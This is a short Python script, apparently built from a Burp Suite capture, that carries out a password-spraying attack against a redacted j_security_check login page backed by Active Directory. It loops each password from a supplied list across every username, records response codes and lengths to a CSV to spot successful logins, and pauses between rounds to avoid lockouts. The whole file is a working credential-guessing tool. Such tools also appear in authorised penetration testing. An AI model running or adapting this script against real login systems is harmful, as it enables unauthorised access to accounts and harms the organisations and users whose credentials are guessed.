import requests
import sys
import time
from datetime import datetime

usage = "usage: python3 passwordSpray.py [/path/to/usernames.file] [/path/to/passwords.file] [minutes between each password loop] [output filename (csv)]"
if len(sys.argv) != 5:
    sys.exit(usage)
usernames = [line.rstrip('\n') for line in open(sys.argv[1])]
passwords = [line.rstrip('\n') for line in open(sys.argv[2])]
sleep_time = int(sys.argv[3]) * 60
report_header = "Username,Password,ResponseCode,ResponseLength,Redirects\n"
with open(sys.argv[4], 'w') as csvfile:
    csvfile.write(report_header)

burp0_url = "https://[redacted]:443/j_security_check"
burp0_cookies = {"redacted"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://[redacted]/j_security_check", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close", "Upgrade-Insecure-Requests": "1"}

for password in passwords:
    report_output = []
    for username in usernames:
        burp0_data={"j_username": username, "j_password": password, "browserLocale": "en_us", "domainName": "trust", "AUTHRULE_NAME": "ADAuthenticator", "buildNum": "100310", "clearCacheBuildNum": "100148"}
        request = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
        report_output.append(f'{username},{password},{request.status_code},{len(request.content)},{len(request.history)}')
    with open(sys.argv[4], 'a', newline='') as csvfile:
        csvfile.write('\n'.join(report_output))
    print("Completed spraying with password: {}. Time: {}".format(password, datetime.now().time()))
    print("Sleeping for {} minutes".format(sys.argv[3]))
    time.sleep(sleep_time)
